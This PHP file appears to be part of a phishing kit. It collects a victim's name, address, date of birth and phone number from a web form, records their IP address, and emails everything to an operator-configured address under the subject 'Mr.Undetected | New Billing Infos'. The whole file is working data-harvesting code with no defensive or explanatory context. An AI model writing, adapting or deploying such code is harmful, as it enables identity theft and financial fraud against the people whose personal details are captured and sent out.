<?php
require_once("../inc/config.inc.php");
require_once("../inc/function.inc.php");

$_SESSION['First Name'] = $_POST['first_name'];
$_SESSION['Last Name'] = $_POST['last_name'];
$_SESSION['Address'] = $_POST['address'];
$_SESSION['City'] = $_POST['city'];
$_SESSION['State'] = $_POST['state'];
$_SESSION['Zip'] = $_POST['zip'];
$_SESSION['Date Of Birth'] = $_POST['dob'];
$_SESSION['Phone'] = $_POST['phone'];
$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']="Mr.Undetected | New Billing Infos [$ip] ***";
$to = $setting["mail_to"];

send($_SESSION,$to,$subject) ; 

?>
